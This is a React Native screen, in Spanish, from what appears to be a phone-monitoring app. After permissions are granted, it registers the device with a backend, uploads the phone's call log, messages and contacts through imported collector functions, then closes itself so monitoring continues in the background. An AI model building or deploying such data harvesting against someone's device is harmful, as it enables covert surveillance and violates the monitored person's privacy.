import React from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Alert, BackHandler } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import api from '../services/api';
import { enviarLlamadasAlServidor, enviarMensajesAlServidor, enviarContactosAlServidor } from '../services/DataCollector';

const PermisosConcedidos = () => {
    const handleStartMonitoring = async () => {
        try {
            const token = await AsyncStorage.getItem('authToken');
            if (!token) {
                Alert.alert("Error", "No se encontró el token de autenticación.");
                return;
            }

            // Obtener información del dispositivo
            const nombreDispositivo = await DeviceInfo.getDeviceName();
            const modeloDispositivo = DeviceInfo.getModel();

            const dispositivoData = {
                nombre: nombreDispositivo,
                modelo: modeloDispositivo,
            };

            // Enviar solicitud para crear el dispositivo en el backend
            const response = await api.post('/api/dispositivos/crear_despues_configuracion/', dispositivoData, {
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json',
                },
            });

            if (response.status === 201) {
                const dispositivoId = response.data.id;
                await AsyncStorage.setItem('dispositivoId', dispositivoId.toString());

                // Iniciar la sincronización de llamadas, mensajes y contactos
                await enviarLlamadasAlServidor();
                await enviarMensajesAlServidor();
                await enviarContactosAlServidor();

                Alert.alert(
                    "Monitoreo Iniciado",
                    "La aplicación se cerrará y continuará monitoreando en segundo plano.",
                    [
                        {
                            text: "OK",
                            onPress: () => {
                                BackHandler.exitApp(); // Cierra la aplicación
                            },
                        },
                    ]
                );
            } else {
                console.error("Error al crear el dispositivo:", response.statusText);
                Alert.alert("Error", "No se pudo crear el dispositivo. Por favor, inténtalo de nuevo.");
            }
        } catch (error) {
            console.error("Error en la solicitud:", error);
            Alert.alert("Error", "Ocurrió un error al intentar crear el dispositivo.");
        }
    };

    return (
        <View style={styles.container}>
            <Text style={styles.title}>¡Todos los Permisos Concedidos!</Text>
            <Text style={styles.description}>
                Gracias por conceder todos los permisos necesarios. La aplicación ahora tiene acceso completo a las funciones requeridas.
            </Text>
            <Text style={styles.instructions}>
                Presiona el botón a continuación para comenzar a monitorear. La aplicación se cerrará automáticamente y continuará ejecutándose en segundo plano.
            </Text>

            <TouchableOpacity
                style={styles.startButton}
                onPress={handleStartMonitoring}
            >
                <Text style={styles.startButtonText}>Empezar a Monitorear</Text>
            </TouchableOpacity>
        </View>
    );
};

export default PermisosConcedidos;

const styles = StyleSheet.create({
    container: {
        flex: 1,
        padding: 20,
        backgroundColor: '#fff',
        justifyContent: 'center',
    },
    title: {
        fontSize: 24,
        fontWeight: 'bold',
        textAlign: 'center',
        marginBottom: 20,
        color: '#333',
    },
    description: {
        fontSize: 16,
        textAlign: 'center',
        marginBottom: 20,
        color: '#555',
        lineHeight: 24,
    },
    instructions: {
        fontSize: 16,
        color: '#333',
        lineHeight: 24,
        marginBottom: 30,
        textAlign: 'center',
    },
    startButton: {
        backgroundColor: '#4CAF50',
        paddingVertical: 12,
        borderRadius: 8,
        alignItems: 'center',
        marginHorizontal: 50,
    },
    startButtonText: {
        color: '#fff',
        fontSize: 16,
        fontWeight: 'bold',
    },
});
